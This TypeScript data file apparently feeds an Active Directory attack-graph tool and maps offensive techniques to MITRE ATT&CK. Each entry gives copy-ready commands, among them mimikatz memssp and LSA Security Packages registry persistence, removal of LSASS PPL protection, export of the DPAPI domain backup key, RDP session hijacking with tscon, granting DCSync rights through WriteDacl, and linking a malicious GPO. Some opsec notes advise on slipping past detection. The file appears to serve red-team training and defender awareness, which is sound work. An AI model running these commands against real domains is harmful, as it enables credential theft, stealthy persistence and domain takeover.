import type { AttackEdge, TechniqueNodeDef } from '../schema';

const r = String.raw;
const mitre = (id: string): { id: string; url: string } => ({
  id,
  url: `https://attack.mitre.org/techniques/${id.replace('.', '/')}/`,
});

/** Persistence, credential-dumping, and ACL-abuse extras (web-verified). */
export const adPersistCredNodes: TechniqueNodeDef[] = [
  {
    id: 'sapphire-ticket',
    label: 'Sapphire Ticket',
    phase: 'persistence',
    summary: "Request a real TGT, then swap in a privileged user's PAC.",
    description:
      'The stealthiest golden/diamond variant: instead of forging a PAC (golden) or editing the issued one (diamond), request a legitimate TGT and substitute the PAC of a privileged user obtained via the S4U2self + U2U extensions. Assembled from legitimately-issued elements via a standard request flow, it best resists golden/diamond detections. Still requires the krbtgt key.',
    tools: [{ name: 'ticketer (Impacket)', url: 'https://github.com/fortra/impacket' }],
    commands: [
      { label: 'Request a sapphire ticket', code: r`ticketer.py -request -impersonate 'Administrator' -domain domain.local -user user -password pass -aesKey <KRBTGT_AES256> -user-id 1115 -domain-sid <SID> baduser`, lang: 'bash' },
    ],
    mitre: mitre('T1558.001'),
    references: [{ label: 'The Hacker Recipes, Sapphire tickets', url: 'https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire' }],
    requires: ['krbtgt key (NT hash or AES)', 'Valid domain credentials to request the base TGT'],
    opsec: 'A real AS-REQ precedes it and the PAC belongs to a genuine privileged user (via S4U2self+U2U), so it lacks the forged-PAC anomalies hunters look for. Prefer the AES256 krbtgt key.',
    difficulty: 'hard',
  },
  {
    id: 'custom-ssp',
    label: 'Custom SSP / memssp',
    phase: 'persistence',
    summary: 'Register a malicious SSP to log plaintext credentials.',
    description: r`A Security Support Provider is a DLL loaded into LSASS that participates in authentication. Register a malicious SSP to log every credential that authenticates locally in cleartext: drop mimilib.dll and APPEND it to the LSA Security Packages registry value (survives reboot), or load it in-memory via mimikatz misc::memssp (no disk artifact, lost on reboot). The registry/mimilib.dll method logs to C:\Windows\System32\kiwissp.log; in-memory memssp logs to C:\Windows\System32\mimilsa.log.`,
    tools: [{ name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' }],
    commands: [
      { label: 'In-memory SSP (lost on reboot)', code: r`privilege::debug
misc::memssp`, lang: 'powershell' },
      { label: 'Persistent SSP via registry (APPEND mimilib to the existing packages)', code: r`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f`, lang: 'cmd' },
    ],
    mitre: mitre('T1547.005'),
    references: [
      { label: 'Pentestlab, Persistence - Security Support Provider', url: 'https://pentestlab.blog/2019/10/21/persistence-security-support-provider/' },
      { label: 'HackTricks, Custom SSP', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/custom-ssp.html' },
    ],
    requires: ['Local admin / SYSTEM on the target (a DC for domain-wide capture)'],
    opsec: "memssp's mimilsa.log under System32 is a well-known IOC. The registry method persists across reboots but adds an audited entry to Security Packages; the in-memory method leaves no disk artifact but does not survive a reboot.",
    difficulty: 'medium',
  },
  {
    id: 'dpapi-domain-backupkey',
    label: 'DPAPI Domain Backup Key',
    phase: 'persistence',
    summary: "Steal the domain DPAPI backup key to decrypt any user's secrets forever.",
    description:
      "Every user's DPAPI master key is also encrypted with a domain-wide DPAPI backup key held by the DCs. With Domain Admin, extract that RSA private key once and you can decrypt ANY domain user's DPAPI-protected secrets (saved browser/credential-manager passwords, RDP creds, certificates) even after they change their password. The backup key effectively never rotates, making this durable persistence.",
    tools: [
      { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'dpapi.py (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Export the domain backup key (mimikatz)', code: r`lsadump::backupkeys /system:dc01.domain.local /export`, lang: 'powershell' },
      { label: 'Retrieve the backup key (Impacket)', code: r`dpapi.py backupkeys -t domain.local/user:pass@dc01 --export`, lang: 'bash' },
      { label: "Decrypt a user's masterkey with the .pvk", code: r`dpapi.py masterkey -file <masterkey_file> -pvk backup_key.pvk`, lang: 'bash' },
    ],
    mitre: mitre('T1555'),
    references: [{ label: 'DSInternals, Retrieving DPAPI backup keys', url: 'https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/' }],
    requires: ['Domain Admin (or equivalent) to read the backup key from a DC'],
    opsec: 'Extracting the backup key is a one-time, high-value action; the MS-BKRP retrieval from a DC is detectable. Once exfiltrated, all subsequent masterkey decryption is offline and invisible.',
    difficulty: 'hard',
  },
  {
    id: 'computer-account-persist',
    label: 'Computer Account Persistence',
    phase: 'persistence',
    summary: 'Create/own a machine account or grant it privileges for durable access.',
    description:
      'Machine accounts are rarely scrutinised like user accounts, yet their passwords authenticate and DCSync just the same. Create or take over a computer account and make it durable: add it to a privileged group, or set its userAccountControl to SERVER_TRUST_ACCOUNT (0x2000 = 8192) so it is treated as a DC and can DCSync. Authenticate with the machine-account hash (PtH / S4U2self) for stealthy long-term access.',
    tools: [
      { name: 'Powermad', url: 'https://github.com/Kevin-Robertson/Powermad' },
      { name: 'addcomputer (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Create a controlled machine account', code: r`New-MachineAccount -MachineAccount Pentestlab -Domain domain.local -DomainController dc.domain.local`, lang: 'powershell' },
      { label: 'Make the machine account a DC (DA required)', code: r`Set-ADComputer Pentestlab -replace @{ "userAccountControl" = 8192 }`, lang: 'powershell' },
      { label: 'DCSync as the machine account', code: r`secretsdump.py 'domain.local/Pentestlab$:Password123@dc01' -just-dc`, lang: 'bash' },
    ],
    mitre: mitre('T1136.002'),
    references: [{ label: 'Pentestlab, Domain Persistence: Machine Account', url: 'https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/' }],
    requires: ['MachineAccountQuota > 0 to create, or Domain Admin to modify userAccountControl / group membership'],
    opsec: 'Machine-account creation (4741), userAccountControl changes (4742), and privileged group additions (4728) are auditable. A workstation account in Domain Admins or flagged SERVER_TRUST_ACCOUNT is a strong indicator.',
    difficulty: 'medium',
  },
  {
    id: 'keepass-extract',
    label: 'KeePass Extraction',
    phase: 'credential-access',
    summary: 'Recover a KeePass master key/password from memory or brute force.',
    description:
      'KeePass databases (.kdbx) are high-value on a compromised host. KeeThief extracts the composite master key from a live KeePass.exe process (works while unlocked, no master password); the CVE-2023-32784 dumper recovers the cleartext master password from a memory/pagefile/hiberfil dump of KeePass 2.x before 2.54; or, with the .kdbx alone, keepass4brute brute-forces the master password offline. The recovered vault frequently yields domain/admin credentials.',
    tools: [
      { name: 'KeeThief', url: 'https://github.com/GhostPack/KeeThief' },
      { name: 'keepass-password-dumper (CVE-2023-32784)', url: 'https://github.com/vdohney/keepass-password-dumper' },
      { name: 'keepass4brute', url: 'https://github.com/r3nt0n/keepass4brute' },
      { name: 'NetExec (keepass_trigger)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Extract the master key from process memory', code: r`Get-KeePassDatabaseKey`, lang: 'powershell' },
      { label: 'Recover master password from a dump (CVE-2023-32784)', code: r`dotnet run <KeePass_dump_file>`, lang: 'bash' },
      { label: 'Brute-force the .kdbx offline', code: r`./keepass4brute.sh database.kdbx wordlist.txt`, lang: 'bash' },
      { label: 'Inject an export trigger into the user config (waits for next unlock)', code: r`nxc smb <host> -u <u> -p <p> -M keepass_discover
nxc smb <host> -u <u> -p <p> -M keepass_trigger -o ACTION=ADD KEEPASS_CONFIG_PATH=<path>`, lang: 'bash' },
    ],
    mitre: mitre('T1555.005'),
    references: [{ label: 'KeeThief (GhostPack)', url: 'https://github.com/GhostPack/KeeThief' }],
    requires: ['Local code execution', 'KeeThief: an unlocked KeePass.exe; CVE-2023-32784: a dump of KeePass 2.x < 2.54; keepass4brute: the .kdbx + a weak master password'],
    opsec: 'KeeThief injects into KeePass.exe; dumping its memory is flagged by EDR (CVE-2023-32784 rules). keepass4brute is offline once the .kdbx is exfiltrated. KeePass 2.54+ mitigates CVE-2023-32784.',
    difficulty: 'medium',
  },
  {
    id: 'rdp-session-hijack',
    label: 'RDP Session Hijack (tscon)',
    phase: 'credential-access',
    summary: "As SYSTEM, tscon into another user's RDP session, no password needed.",
    description:
      'From SYSTEM, the native tscon.exe reconnects any existing RDP session (active or disconnected) to your own session without the password or a prompt. Enumerate with query user, then connect to a more privileged session to inherit its interactive token and loaded credentials/tickets, which is quieter than dumping LSASS. A common trick launches tscon via a temporary service so it runs as SYSTEM.',
    tools: [{ name: 'tscon.exe (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon' }, { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' }],
    commands: [
      { label: 'List sessions and IDs', code: r`query user`, lang: 'cmd' },
      { label: 'As SYSTEM, hijack session 2 to the console', code: r`tscon 2 /dest:console`, lang: 'cmd' },
      { label: 'Get SYSTEM, then tscon via a service', code: r`sc create sesshijack binpath= "cmd.exe /k tscon 2 /dest:console"
sc start sesshijack`, lang: 'cmd' },
      { label: 'List interactive sessions to hijack (NetExec)', code: r`nxc smb <host> -u user -p pass --qwinsta`, lang: 'cmd' },
      { label: 'Run a command as a logged-on user (NetExec schtask_as)', code: r`nxc smb <host> -u user -p pass -M schtask_as -o USER=victim CMD='whoami'`, lang: 'cmd' },
    ],
    mitre: mitre('T1563.002'),
    references: [
      { label: 'HackTricks, RDP Sessions Abuse', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/rdp-sessions-abuse.html' },{ label: 'ired.team, RDP Hijacking with tscon', url: 'https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement' }],
    requires: ['SYSTEM on the host', 'An existing RDP session belonging to another (ideally more privileged) user'],
    opsec: 'Detected by tscon.exe spawned as SYSTEM without a password and by service creation (7045). The hijacked user may notice their session disconnected/reconnected. No credential material is written to disk.',
    difficulty: 'medium',
  },
  {
    id: 'lsass-ppl-bypass',
    label: 'LSASS PPL / LSA Protection Bypass',
    phase: 'credential-access',
    summary: 'Defeat RunAsPPL with mimikatz mimidrv to dump LSASS.',
    description: r`RunAsPPL runs LSASS as a Protected Process Light, blocking normal handle access and standard dumping. Mimikatz ships a signed kernel driver, mimidrv.sys: load it with !+, then !processprotect /process:lsass.exe /remove strips the protection flag so sekurlsa::logonpasswords works. Other routes exist (vulnerable signed drivers / BYOVD, or disabling RunAsPPL in the registry and rebooting).`,
    tools: [{ name: 'Mimikatz (mimidrv.sys)', url: 'https://github.com/gentilkiwi/mimikatz' }],
    commands: [
      { label: 'Load mimidrv, remove LSASS protection, dump', code: r`privilege::debug
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords`, lang: 'powershell' },
      { label: 'Disable RunAsPPL via registry (needs reboot)', code: r`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 0 /f`, lang: 'powershell' },
    ],
    mitre: mitre('T1003.001'),
    references: [
      { label: 'HackTricks, Credentials Protections (RunAsPPL/LSA)', url: 'https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/credentials-protections.html' },{ label: 'itm4n, LSA Protection (RunAsPPL)', url: 'https://itm4n.github.io/lsass-runasppl/' }],
    requires: ['Local admin / SYSTEM', 'Ability to load a kernel driver (mimidrv.sys) or set the RunAsPPL registry value'],
    opsec: 'Very high-signal: loading mimidrv.sys writes a known-malicious signed driver and registers a kernel service, and EDR/AV detect both. The registry route (RunAsPPL=0) needs a reboot and is itself audited.',
    difficulty: 'hard',
  },
  {
    id: 'mscache-crack',
    label: 'Crack MSCacheV2 (DCC2)',
    phase: 'credential-access',
    summary: 'Crack cached domain logon credentials (DCC2) offline.',
    description:
      'Domain-joined hosts cache the last domain logons as MSCacheV2 (DCC2) so users can log in when the DC is unreachable. With SYSTEM, dump them from the SECURITY hive (secretsdump LOCAL, or mimikatz lsadump::cache). DCC2 cannot be passed (no PtH/PtT), so it must be cracked offline: PBKDF2-HMAC-SHA1 with 10240 iterations, so slow, but weak passwords still fall and yield valid domain credentials.',
    tools: [
      { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'hashcat', url: 'https://hashcat.net/hashcat/' },
    ],
    commands: [
      { label: 'Dump DCC2 from saved hives', code: r`secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`, lang: 'bash' },
      { label: 'Dump cached creds (mimikatz)', code: r`lsadump::cache`, lang: 'powershell' },
      { label: 'Crack DCC2 (hashcat mode 2100)', code: r`hashcat -m 2100 '$DCC2$10240#username#hash' rockyou.txt -r rules/best64.rule`, lang: 'bash' },
    ],
    mitre: mitre('T1003.005'),
    references: [{ label: 'ired.team, Dumping & cracking mscash', url: 'https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials' }],
    requires: ['Local admin / SYSTEM to read the SECURITY hive', 'A crackable password (DCC2 is slow)'],
    opsec: 'Dumping is the same SECURITY-hive read as SAM/LSA secrets; cracking is offline and invisible. The high iteration count makes brute force expensive, so prioritise targeted wordlists.',
    difficulty: 'medium',
  },
  {
    id: 'acl-writeowner',
    label: 'WriteOwner',
    phase: 'priv-esc',
    summary: 'Set yourself as owner of an object, then grant full rights.',
    description:
      'WriteOwner over a target lets you set its owner to a principal you control. The owner can always rewrite the DACL, so once you own it you grant yourself GenericAll (or DCSync on the domain object) and take it over. A classic two-step BloodHound edge feeding straight into GenericAll abuse.',
    tools: [
      { name: 'owneredit (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 set owner <target> <attacker>', lang: 'bash' },
      { label: 'Set owner (Impacket)', code: r`owneredit.py -action write -new-owner 'attacker' -target 'victim' domain.local/user:pass`, lang: 'bash' },
      { label: 'Set owner (bloodyAD)', code: r`bloodyAD -d domain.local -u user -p pass set owner TARGET attacker`, lang: 'bash' },
    ],
    mitre: mitre('T1098'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, BloodHound WriteOwner edge', url: 'https://bloodhound.specterops.io/resources/edges/write-owner' },{ label: 'The Hacker Recipes, Grant ownership', url: 'https://www.thehacker.recipes/ad/movement/dacl/grant-ownership' }],
    requires: ['WriteOwner over the target object'],
    opsec: 'The owner change and subsequent DACL write are auditable (4662/5136). Restore the original owner and remove added ACEs after use.',
    difficulty: 'medium',
  },
  {
    id: 'acl-writedacl',
    label: 'WriteDacl',
    phase: 'priv-esc',
    summary: 'Rewrite a DACL → grant yourself any right on the object.',
    description:
      'WriteDacl lets you modify a target object\'s DACL directly. Add an ACE granting yourself GenericAll over a user/computer (then take it over), or, when the target is the domain object, grant the DS-Replication-Get-Changes rights that enable DCSync. One ACL write can convert a low-priv foothold into the ability to replicate every secret in the domain.',
    tools: [
      { name: 'dacledit (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'Grant DCSync via WriteDacl (bloodyAD)', code: r`bloodyAD -d domain.local -u user -p pass add dcsync attacker`, lang: 'bash' },
      { label: 'Grant DCSync rights (Impacket)', code: r`dacledit.py -action write -rights DCSync -principal attacker -target 'DC=domain,DC=local' domain.local/user:pass`, lang: 'bash' },
    ],
    mitre: mitre('T1098'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, BloodHound WriteDacl edge', url: 'https://bloodhound.specterops.io/resources/edges/write-dacl' },{ label: 'The Hacker Recipes, Grant rights (DACL)', url: 'https://www.thehacker.recipes/ad/movement/dacl/grant-rights' }],
    requires: ['WriteDacl over the target object (an object, or the domain head for DCSync)'],
    opsec: 'DACL modifications generate directory-change events (4662/5136); granting DS-Replication rights is high-fidelity. Remove the added ACE immediately after use.',
    difficulty: 'medium',
  },
  {
    id: 'acl-gplink-ou',
    label: 'Write gPLink on OU',
    phase: 'priv-esc',
    summary: 'Link a malicious GPO to an OU via the gPLink attribute.',
    description:
      'WriteGPLink (Manage GP-Link) over an OU/domain/site lets you edit its gPLink attribute to link a GPO of your choosing, applying it to every user and computer under the OU, including nested ones. Combined with a GPO you can edit (or a fake GPO server via OUned.py), this delivers a malicious immediate task / local-admin change to whole OUs. It controls which GPO an OU applies; it does not itself edit a GPO.',
    tools: [
      { name: 'pyGPOAbuse', url: 'https://github.com/Hackndo/pyGPOAbuse' },
      { name: 'OUned.py', url: 'https://github.com/synacktiv/OUned' },
    ],
    commands: [
      { label: 'Stage a payload in a controllable GPO', code: r`pygpoabuse.py domain.local/user -hashes :<NTHASH> -gpo-id <GPO-GUID>`, lang: 'bash' },
      { label: 'Link the GPO to the target OU (PowerView)', code: r`New-GPLink -Name 'Evil GPO' -Target 'OU=Servers,DC=domain,DC=local'`, lang: 'powershell' },
    ],
    mitre: mitre('T1484.001'),
    references: [
      { label: 'SpecterOps, A Red Teamer\'s Guide to GPOs and OUs', url: 'https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e' },{ label: 'BloodHound, WriteGPLink', url: 'https://bloodhound.specterops.io/resources/edges/write-gp-link' }],
    requires: ['WriteGPLink over the target OU/domain/site', 'A controllable/linkable GPO (editable GPO, or a fake GPO server via OUned.py)'],
    opsec: 'The gPLink write is a directory change (5136); affected hosts run gpupdate and execute the policy as SYSTEM. Unlink and clean up promptly.',
    difficulty: 'hard',
  },
];

export const adPersistCredEdges: AttackEdge[] = [
  // Persistence (category ad-cat-persistence created in ad-categories.ts)
  { source: 'ad-cat-persistence', target: 'sapphire-ticket' },
  { source: 'ad-cat-persistence', target: 'custom-ssp' },
  { source: 'ad-cat-persistence', target: 'dpapi-domain-backupkey' },
  { source: 'ad-cat-persistence', target: 'computer-account-persist' },
  // Persistence that re-grants domain dominance (loops back; goal nodes auto-dash):
  { source: 'adminsdholder', target: 'domain-admin', label: 'SDProp re-grants control' },
  { source: 'computer-account-persist', target: 'dcsync', label: 'SERVER_TRUST_ACCOUNT → replicate' },
  { source: 'krbtgt-hash', target: 'sapphire-ticket' },
  { source: 'sapphire-ticket', target: 'pass-the-ticket' },
  // Credential dumping (category ad-cat-cred-dump)
  { source: 'keepass-extract', target: 'lateral-movement-cme', label: 'vault creds' },
  { source: 'rdp-session-hijack', target: 'lateral-movement-cme', label: 'as hijacked user' },
  // PPL bypass ENABLES an LSASS dump (it doesn't extract creds itself).
  { source: 'lsass-ppl-bypass', target: 'dump-lsass', label: 'PPL removed → dump' },
  { source: 'mscache-crack', target: 'valid-domain-creds', label: 'cracked domain password' },
  // ACL extras (existing ad-cat-dacl category)
  { source: 'ad-cat-dacl', target: 'acl-writeowner' },
  { source: 'ad-cat-dacl', target: 'acl-writedacl' },
  { source: 'ad-cat-dacl', target: 'acl-gplink-ou' },
  // WriteOwner → take ownership → WriteDacl → grant yourself GenericAll → then the
  // object-appropriate abuse. DCSync is just ONE GenericAll outcome (domain object),
  // not what WriteDacl/WriteOwner lead to directly.
  { source: 'acl-writeowner', target: 'acl-writedacl', label: 'own → rewrite DACL' },
  { source: 'acl-writedacl', target: 'acl-genericall', label: 'grant yourself control' },
  { source: 'acl-gplink-ou', target: 'gpo-abuse' },
];
